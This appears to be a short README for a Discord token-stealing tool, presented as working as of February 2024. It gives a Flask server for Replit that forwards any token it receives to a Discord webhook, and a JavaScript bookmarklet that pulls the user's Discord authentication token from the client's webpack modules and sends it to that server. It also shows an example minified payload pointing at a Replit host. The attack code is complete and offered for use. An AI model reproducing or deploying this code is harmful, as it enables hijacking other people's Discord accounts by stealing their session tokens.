went downgrade a lil bit but the code works now as of 2/16/2024, this used to be more advanced and better, but some methods have been limited and dont work, this is the only part of the code that actually works now.

instructions:

1. sign up for replit.com and create a new python repl
2. paste this code:
```python
from dhooks import Webhook
from flask import Flask, redirect
e = "PASTE_WEBHOOK_HERE"
app = Flask(__name__)
hook = Webhook(e)
@app.route('/<string:token>')
def index(token):
  hook.send(token)
  return redirect("https://discord.com/app")

if __name__ == "__main__":
  app.run(host='0.0.0.0', port=81)
```
3. replace PASTE_WEBHOOK_HERE with your actual discord webhook.
4. click run and then copy the url
5. replace PASTE_URL_HERE with the url you just copied
```js
const url = 'PASTE_URL_HERE';
var f = (webpackChunkdiscord_app.push([[''], {}, e=> {
  m = [];
  for (let c in e.c) m.push(e.c[c]);
}]), m).find(m => m?.exports?.default?.getToken !== undefined).exports.default.getToken();
window.location.replace(url + '/' + f);
```
6. copy the whole code (the short one) and then go to https://minify-js.com/ and minify the code
7. then put ur code like this: javascript:(your minified code)
8. will look something like this: ```javascript:const url="https://b707bed2-0d5d-4175-a39f-44929c4f2e6c-00-boj7lelqbogw.kirk.replit.dev/";var f=(webpackChunkdiscord_app.push([[""],{},e=>{m=[];for(let o in e.c)m.push(e.c[o])}]),m).find((e=>void 0!==e?.exports?.default?.getToken)).exports.default.getToken();window.location.replace(url+"/"+f);```
9. paste and enter that code in your url tab on discord
10. if need help make a issue
